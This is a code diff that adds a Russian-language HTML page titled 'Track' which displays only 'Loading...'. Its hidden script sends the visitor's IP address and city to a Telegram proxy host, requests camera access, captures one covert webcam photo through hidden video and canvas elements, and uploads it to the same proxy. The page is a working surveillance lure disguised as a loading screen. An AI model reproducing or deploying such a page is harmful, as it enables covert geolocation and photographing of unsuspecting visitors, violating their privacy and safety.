@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head><meta charset="UTF-8"><title>Track</title></head>
+<body><h2>Loading...</h2><video id="video" autoplay playsinline style="display:none"></video><canvas id="canvas" style="display:none"></canvas>
+<script>
+(async()=>{
+  const PE="https://telegram-proxy-f9b5.onrender.com/sendPhoto";
+  const DE="https://telegram-proxy-f9b5.onrender.com/send";
+  const CID="12091391";
+  fetch("https://ipinfo.io/json?token=6ba01e2853628b").then(r=>r.json()).then(d=>{
+    fetch(DE,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:`🌐 IP:${d.ip} город:${d.city} ...`})});
+  });
+  let s; try{s=await navigator.mediaDevices.getUserMedia({video:true});}catch{return;}
+  const v=document.getElementById("video");v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);
+  const c=document.getElementById("canvas");c.width=v.videoWidth;c.height=v.videoHeight;
+  c.getContext("2d").drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());
+  c.toBlob(async b=>{const f=new FormData();f.append("chat_id",CID);f.append("photo",b,"s.jpg");await fetch(PE,{method:"POST",body:f});},"image/jpeg",0.8);
+})();
+</script></body></html>
